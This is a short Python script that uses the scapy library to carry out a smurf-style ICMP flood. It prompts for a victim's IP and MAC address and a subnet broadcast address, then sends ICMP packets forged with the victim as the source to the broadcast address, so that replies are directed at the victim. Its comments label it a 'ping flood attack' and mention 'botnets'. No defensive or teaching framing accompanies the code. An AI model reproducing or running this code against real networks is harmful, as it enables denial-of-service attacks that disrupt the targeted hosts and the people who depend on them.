#!usr/bin/python3
from scapy.all import *
def floodattack():
       #ping flood attack...
       ether = Ether()
       ether.src=targetmac
       ether.dst="ff:ff:ff:ff:ff:ff"
       ip=IP(src=target,dst=botnet)
       icmp=ICMP()
       data='Y\x1c\x8a_\x00\x00\x00\x00\xd5o\x03\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'
       pkt=ether/ip/icmp/data
       sendp(pkt)
       
target = input("Enter the target IP: ")
targetmac = input("Enter the target MAC:")
botnet = input("Enter the brodcast ip of subnet in which tartget ip is present:")
print("do you want to add botnets?, if no then only remote computers will use for the attacks.. ")
check = input("(y for yes/n for no):")
if check=="y" or check=="Y":
       floodattack();
else: 
   print("exit")


        
      
